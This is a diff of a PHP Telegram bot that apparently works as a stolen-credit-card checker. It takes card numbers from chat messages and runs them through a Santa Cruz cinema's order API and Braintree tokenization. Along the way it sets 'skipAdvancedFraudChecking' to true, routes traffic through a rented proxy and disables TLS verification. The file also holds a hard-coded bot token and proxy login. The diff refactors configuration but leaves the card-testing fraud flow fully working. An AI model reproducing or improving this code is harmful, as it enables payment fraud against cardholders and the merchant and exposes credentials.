@@ -1,16 +1,32 @@
 <?php
 error_reporting(E_ERROR | E_PARSE);
+
+// Start session
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
+
 include("userAgent.php");
 
-// Telegram Bot Configuration
-define('BOT_TOKEN', '8269957175:AAEA2PiWIt5s3KWsvRJRLRKXnY-tdko9z-4'); // Replace with your bot token
+// Telegram Bot Configuration - Use environment variables for security
+define('BOT_TOKEN', getenv('BOT_TOKEN') ?: '8269957175:AAEA2PiWIt5s3KWsvRJRLRKXnY-tdko9z-4');
 define('API_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');
+
+// Proxy Configuration - Use environment variables
+define('PROXY_HOST', getenv('PROXY_HOST') ?: 'proxy.okeyproxy.com:31212');
+define('PROXY_AUTH', getenv('PROXY_AUTH') ?: 'customer-4nao708160-continent-AS-country-SG:7tzdwvba');
 
 // Initialize
 $agent = new userAgent();
 $UA = $agent->generate();
 $UAiPhone = $agent->generate('iphone');
-!is_dir('C:\xampp\c') ? shell_exec('mkdir C:\xampp\c') : NULL;
+
+// Create temp directory for cookies (cross-platform)
+$tempDir = sys_get_temp_dir() . '/bot_cookies';
+if (!is_dir($tempDir)) {
+    mkdir($tempDir, 0755, true);
+}
+define('COOKIE_DIR', $tempDir);
 
 // Get incoming message
 $content = file_get_contents("php://input");
@@ -74,16 +90,13 @@ if (preg_match('/^\d{15,16}\|/', $text)) {
         $type2 = $cc[0] == '4' ? 'VI' : ($cc[0] == '5' ? 'MC' : 'JCB');
         $yy = strlen($yyyy) == 4 ? substr($yyyy, 2, 2) : $yyyy;
 
-        $proxy = 'proxy.okeyproxy.com:31212';
-        $proxyuserpwd = 'customer-4nao708160-continent-AS-country-SG:7tzdwvba';
-
         $retry = 0;
         retry:
 
         $X = R('https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/CreateOrder',
             [
-                'proxy' => 'proxy.okeyproxy.com:31212',
-                'proxyuserpwd' => 'customer-4nao708160-continent-AS-country-SG:7tzdwvba',
+                'proxy' => PROXY_HOST,
+                'proxyuserpwd' => PROXY_AUTH,
                 'ssl_verifypeer' => 0,
                 'post' => 1,
                 'postfields' => '{"cinemaId":"2110","userID":""}',
@@ -96,8 +109,8 @@ if (preg_match('/^\d{15,16}\|/', $text)) {
 
         $Xe = R('https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/PaymentClientToken',
             [
-                'proxy' => 'proxy.okeyproxy.com:31212',
-                'proxyuserpwd' => 'customer-4nao708160-continent-AS-country-SG:7tzdwvba',
+                'proxy' => PROXY_HOST,
+                'proxyuserpwd' => PROXY_AUTH,
                 'ssl_verifypeer' => 0,
                 'post' => 1,
                 'postfields' => '{"cinemaId":"2110"}',
@@ -111,8 +124,8 @@ if (preg_match('/^\d{15,16}\|/', $text)) {
 
         R('https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/AddConcessionsOrder',
             [
-                'proxy' => 'proxy.okeyproxy.com:31212',
-                'proxyuserpwd' => 'customer-4nao708160-continent-AS-country-SG:7tzdwvba',
+                'proxy' => PROXY_HOST,
+                'proxyuserpwd' => PROXY_AUTH,
                 'ssl_verifypeer' => 0,
                 'post' => 1,
                 'postfields' => '{"cinemaId":"2110","concessionItems":[{"Id":"144","HeadOfficeItemCode":"","HOPK":"144","Description":"BEER Santa Cruz Mtn Pacific IPA","DescriptionAlt":"","DescriptionTranslations":[],"ExtendedDescription":"","ExtendedDescriptionAlt":"","ExtendedDescriptionTranslations":[],"PriceInCents":950,"TaxInCents":84,"IsVariablePriceItem":false,"MinimumVariablePriceInCents":null,"MaximumVariablePriceInCents":null,"ItemClassCode":"0025","RequiresPickup":false,"CanGetBarcode":false,"ShippingMethod":"N","RestrictToLoyalty":false,"LoyaltyDiscountCode":"","RecognitionMaxQuantity":0,"RecognitionPointsCost":0,"RecognitionBalanceTypeId":null,"IsRecognitionOnly":false,"RecognitionId":0,"RecognitionSequenceNumber":0,"RecognitionExpiryDate":null,"RedeemableType":1,"IsAvailableForInSeatDelivery":false,"IsAvailableForPickupAtCounter":true,"VoucherSaleType":"","AlternateItems":[],"PackageChildItems":[],"ModifierGroups":[],"SmartModifiers":[],"DiscountsAvailable":[],"RecipeItems":[],"SellingLimits":{"DailyLimits":[],"IndefiniteLimit":null},"SellingTimeRestrictions":[],"RequiresPreparing":true,"is_restricted":false,"quantity":1,"IsSeatDelivery":false}],"userSessionId":"' . $userSessionId . '","seats":[],"userID":""}',
@@ -124,8 +137,8 @@ if (preg_match('/^\d{15,16}\|/', $text)) {
 
         $Xeb = R('https://payments.braintree-api.com/graphql',
             [
-                'proxy' => 'proxy.okeyproxy.com:31212',
-                'proxyuserpwd' => 'customer-4nao708160-continent-AS-country-SG:7tzdwvba',
+                'proxy' => PROXY_HOST,
+                'proxyuserpwd' => PROXY_AUTH,
                 'ssl_verifypeer' => 0,
                 'post' => 1,
                 'postfields' => '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"' . uuid4() . '"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"' . $cc . '","expirationMonth":"' . $mm . '","expirationYear":"' . $yyyy . '","billingAddress":{"postalCode":"' . rand(11111, 99999) . '"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
@@ -140,8 +153,8 @@ if (preg_match('/^\d{15,16}\|/', $text)) {
 
         $Xebe = R('https://www.santacruzcinema.com/wp-json/wp/v2/api/content/paymentapi/Checkout',
             [
-                'proxy' => 'proxy.okeyproxy.com:31212',
-                'proxyuserpwd' => 'customer-4nao708160-continent-AS-country-SG:7tzdwvba',
+                'proxy' => PROXY_HOST,
+                'proxyuserpwd' => PROXY_AUTH,
                 'ssl_verifypeer' => 0,
                 'post' => 1,
                 'postfields' => '{"PaymentToken":"' . $token . '","userSessionId":"' . $userSessionId . '","Name":"' . $n . ' ' . $l . '","Email":"' . $e . '","userID":"","skipBraintree":false,"skipAdvancedFraudChecking":true,"remainingOrderValue":-1}',
@@ -218,7 +231,7 @@ function R($u, $p = [], $t = 0)
     foreach ($_SESSION['bG'] as $E => $N) {
         $p[l($E)] = $N;
     }
-    $c = 'C:\xampp\c/' . getmypid() . '_' . $t . '_' . $cookie . '.txt';
+    $c = COOKIE_DIR . '/' . getmypid() . '_' . $t . '_' . $cookie . '.txt';
     $p[10031] = $c;
     $p[10082] = $c;
     $ch = curl_init($u);
@@ -271,7 +284,7 @@ function REMOVE_COOKIE()
 {
     global $cookie;
     $pid = getmypid();
-    foreach (glob('C:\xampp\c/' . $pid . '_*_' . $cookie . '.txt') as $value) {
+    foreach (glob(COOKIE_DIR . '/' . $pid . '_*_' . $cookie . '.txt') as $value) {
         if (is_file($value)) {
             @unlink($value);
         }
